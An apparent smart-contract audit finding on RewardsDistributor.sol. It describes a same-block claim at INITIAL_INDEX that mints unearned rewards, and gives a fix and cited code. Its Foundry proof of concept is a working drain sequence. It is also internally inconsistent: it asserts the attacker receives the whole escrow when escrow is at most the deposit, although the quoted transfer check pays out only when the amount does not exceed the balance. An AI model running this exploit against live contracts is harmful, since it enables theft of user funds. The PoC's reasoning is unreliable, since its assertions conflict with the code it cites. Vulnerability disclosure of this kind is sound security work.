### Title
Reward checkpoint at `INITIAL_INDEX` mints unearned rewards and drains escrow - ([File: contracts/RewardsDistributor.sol])

### Summary
`RewardsDistributor._calculateTokenDelta()` treats a never-initialized account index as zero when the global token index is still `INITIAL_INDEX`. An account that already holds a rewarded `DepositToken` when its reward stream is activated can claim in the same block and receive `balance * INITIAL_INDEX / 1e18`, although no reward time has elapsed. [1](#0-0) 

### Finding Description
When a reward token stream is enabled, `_updateTokenSpeed()` initializes `tokenStates[token_]` to `TokenState({index: INITIAL_INDEX, timestamp: block.timestamp})`. [2](#0-1) 

For an account with `accountIndexOf[token_][account_] == 0`, `_calculateTokenDelta()` substitutes `INITIAL_INDEX` only if `_tokenIndex > INITIAL_INDEX`. If the account calls `claimRewards()` in the same block as stream activation, `_tokenIndex == INITIAL_INDEX`, so `_accountIndex` remains zero and `_deltaIndex == INITIAL_INDEX`. [1](#0-0) 

The resulting `tokensAccruedOf[account]` credit is equal to the account’s full deposit-token balance because `wadMul(1e18)` returns the balance. `claimRewards()` then transfers that accrued amount if the distributor holds enough reward tokens. [3](#0-2) [4](#0-3) 

### Impact Explanation
An unprivileged attacker who already holds the relevant deposit token can back-run a normal `updateTokenSpeed()` activation transaction in the same block and claim up to the distributor’s entire reward-token balance. This is theft of unclaimed yield and breaks the reward-accrual invariant that rewards are proportional to elapsed time and token speed. [5](#0-4) 

The same boundary condition can occur when a stream is configured and disabled without the index advancing past `INITIAL_INDEX`; a later zero-speed update or claim still evaluates the zero account index against `INITIAL_INDEX`. [6](#0-5) 

### Likelihood Explanation
The attacker needs to hold a reward-bearing deposit token before its reward stream is initialized and submit `claimRewards()` in the same block as activation. This is publicly reachable through `claimRewards(address)`, does not require malicious governance, oracle manipulation, or privileged execution, and can be performed by monitoring the activation transaction. [7](#0-6) 

Exploitation is constrained to newly initialized streams whose index is exactly `INITIAL_INDEX` and by the reward tokens held by the distributor. Existing streams whose index has already advanced are protected by the fallback that initializes the account at `INITIAL_INDEX`. [8](#0-7) 

### Recommendation
Initialize an unseen account to the current token index when no elapsed reward delta exists. For example:

```solidity
// contracts/RewardsDistributor.sol
if (_accountIndex == 0) {
    _accountIndex = _tokenIndex > INITIAL_INDEX ? INITIAL_INDEX : _tokenIndex;
}
```

Alternatively, explicitly return zero when `_tokenIndex == INITIAL_INDEX && accountIndexOf[token_][account_] == 0`. Add a regression test that deposits before `updateTokenSpeed()`, calls `claimRewards()` in the same block, and asserts zero claimed rewards.

### Proof of Concept

```solidity
// Foundry test against the repository's local deployment fixture.
function testInitialIndexRewardDrain() public {
    uint256 depositAmount = 1_000e18;

    // Attacker establishes a deposit-token balance before reward tracking starts.
    vm.startPrank(attacker);
    collateral.approve(address(depositToken), depositAmount);
    depositToken.deposit(depositAmount, attacker);
    vm.stopPrank();

    assertEq(depositToken.balanceOf(attacker), depositAmount);
    assertEq(rewardsDistributor.accountIndexOf(depositToken, attacker), 0);

    uint256 escrowBefore = rewardToken.balanceOf(address(rewardsDistributor));
    assertGt(escrowBefore, 0);

    // Benign activation initializes index to INITIAL_INDEX and timestamp to now.
    vm.prank(governor);
    rewardsDistributor.updateTokenSpeed(IERC20(address(depositToken)), 1);

    // Same timestamp: no reward time has elapsed, but deltaIndex is INITIAL_INDEX.
    vm.prank(attacker);
    rewardsDistributor.claimRewards(attacker);

    // Attacker is credited depositAmount worth of unearned rewards and drains
    // the distributor if escrowBefore <= depositAmount.
    assertEq(rewardToken.balanceOf(attacker), escrowBefore);
    assertEq(rewardToken.balanceOf(address(rewardsDistributor)), 0);
}
```

The decisive condition is no `vm.warp()` between `updateTokenSpeed()` and `claimRewards()`: `_calculateTokenIndex()` leaves the index at `INITIAL_INDEX`, while `_calculateTokenDelta()` still calculates a nonzero delta from account index zero. [9](#0-8)

### Citations

**File:** contracts/RewardsDistributor.sol (L134-145)
```text
    function claimRewards(address account_) external override {
        claimRewards(account_, tokens);
    }

    /**
     * @notice Claim tokens accrued by account in the specified tokens
     */
    function claimRewards(address account_, IERC20[] memory tokens_) public override {
        address[] memory _accounts = new address[](1);
        _accounts[0] = account_;
        claimRewards(_accounts, tokens_);
    }
```

**File:** contracts/RewardsDistributor.sol (L150-167)
```text
    function claimRewards(address[] memory accounts_, IERC20[] memory tokens_) public override nonReentrant {
        uint256 _accountsLength = accounts_.length;
        uint256 _tokensLength = tokens_.length;
        for (uint256 i; i < _tokensLength; ++i) {
            IERC20 _token = tokens_[i];

            if (tokenStates[_token].index > 0) {
                _updateTokenIndex(_token);
                for (uint256 j; j < _accountsLength; j++) {
                    _updateTokensAccruedOf(_token, accounts_[j]);
                }
            }
        }

        for (uint256 j; j < _accountsLength; j++) {
            address _account = accounts_[j];
            _transferRewardIfEnoughTokens(_account, tokensAccruedOf[_account]);
        }
```

**File:** contracts/RewardsDistributor.sol (L197-211)
```text
    function _calculateTokenIndex(
        TokenState memory _supplyState,
        IERC20 token_
    ) private view returns (uint224 _newIndex, uint32 _newTimestamp) {
        uint256 _speed = tokenSpeeds[token_];
        uint256 _deltaTimestamps = block.timestamp - uint256(_supplyState.timestamp);
        if (_deltaTimestamps > 0 && _speed > 0) {
            uint256 _totalSupply = token_.totalSupply();
            uint256 _tokensAccrued = _deltaTimestamps * _speed;
            uint256 _ratio = _totalSupply > 0 ? _tokensAccrued.wadDiv(_totalSupply) : 0;
            _newIndex = (_supplyState.index + _ratio).toUint224();
            _newTimestamp = block.timestamp.toUint32();
        } else if (_deltaTimestamps > 0 && _supplyState.index > 0) {
            _newTimestamp = block.timestamp.toUint32();
        }
```

**File:** contracts/RewardsDistributor.sol (L222-230)
```text
        _tokenIndex = _tokenState.index;
        uint256 _accountIndex = accountIndexOf[token_][account_];

        if (_accountIndex == 0 && _tokenIndex > INITIAL_INDEX) {
            _accountIndex = INITIAL_INDEX;
        }

        uint256 _deltaIndex = _tokenIndex - _accountIndex;
        _tokensDelta = token_.balanceOf(account_).wadMul(_deltaIndex);
```

**File:** contracts/RewardsDistributor.sol (L248-254)
```text
    function _transferRewardIfEnoughTokens(address account_, uint256 amount_) private {
        IERC20 _rewardToken = rewardToken;
        uint256 _balance = _rewardToken.balanceOf(address(this));
        if (amount_ > 0 && amount_ <= _balance) {
            tokensAccruedOf[account_] = 0;
            _rewardToken.safeTransfer(account_, amount_);
            emit RewardClaimed(account_, amount_);
```

**File:** contracts/RewardsDistributor.sol (L261-265)
```text
    function _updateTokensAccruedOf(IERC20 token_, address account_) private {
        (uint256 _tokenIndex, uint256 _tokensDelta) = _calculateTokenDelta(tokenStates[token_], token_, account_);
        accountIndexOf[token_][account_] = _tokenIndex;
        tokensAccruedOf[account_] = tokensAccruedOf[account_] + _tokensDelta;
        emit TokensAccruedUpdated(token_, account_, _tokensDelta, _tokenIndex);
```

**File:** contracts/RewardsDistributor.sol (L294-300)
```text
        } else if (newSpeed_ > 0) {
            // Add token to the list
            if (tokenStates[token_].index == 0) {
                if (tokens.length == MAX_REWARD_TOKENS) revert ReachedMaxRewardTokens();
                tokenStates[token_] = TokenState({index: INITIAL_INDEX, timestamp: block.timestamp.toUint32()});
                tokens.push(token_);
            } else {
```
